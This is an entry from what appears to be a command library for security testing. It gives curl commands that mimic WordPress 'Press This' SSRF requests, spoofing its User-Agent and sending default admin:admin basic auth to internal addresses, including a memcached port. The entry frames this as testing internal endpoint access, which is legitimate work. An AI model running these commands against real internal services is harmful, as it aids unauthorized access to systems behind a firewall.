---
id: cmd-simulate-ssrf-187520
data: >-
  curl -v -H "Host: 192.168.0.1:12345" -H "Authorization: Basic
  YWRtaW46YWRtaW4=" -H "User-Agent: Press This (WordPress/4.7-RC1)" -H "Accept:
  */*" http://192.168.0.1:12345/
tags:
  - ssrf
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:31:30.685Z'
verified: false
validated: true
submitted: true
---
# simulate-ssrf-request

## Command

```bash
curl -v -H "Host: 192.168.0.1:12345" -H "Authorization: Basic YWRtaW46YWRtaW4=" -H "User-Agent: Press This (WordPress/4.7-RC1)" -H "Accept: */*" http://192.168.0.1:12345/
```

## Description

This curl command simulates the HTTP request sent by WordPress after following the SSRF redirect, including the injected basic auth and specific User-Agent, to test internal endpoint access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -H "Host: ..." | Specifies the internal host:port | Yes |
| -H "Authorization: ..." | Base64-encoded basic auth | Yes (for auth injection) |
| -H "User-Agent: ..." | Mimics Press This identifier | Yes |
| http://192.168.0.1:12345/ | Target internal URL | Yes |

## Examples

### Basic Usage

```bash
curl -v -H "Host: 192.168.0.1:80" -H "User-Agent: Press This" http://192.168.0.1/
```

### Advanced Usage

```bash
curl -v --user admin:admin -H "User-Agent: Press This (WordPress/4.7-RC1)" http://10.0.0.1:11211/
```

## Expected Output

Verbose output showing the request headers sent and response from the internal service, such as HTTP/1.1 200 OK followed by service data.

## Related

- [[Related Procedure: Follow-Redirect-to-Access-Internal-Endpoint-with-Basic-Auth]]
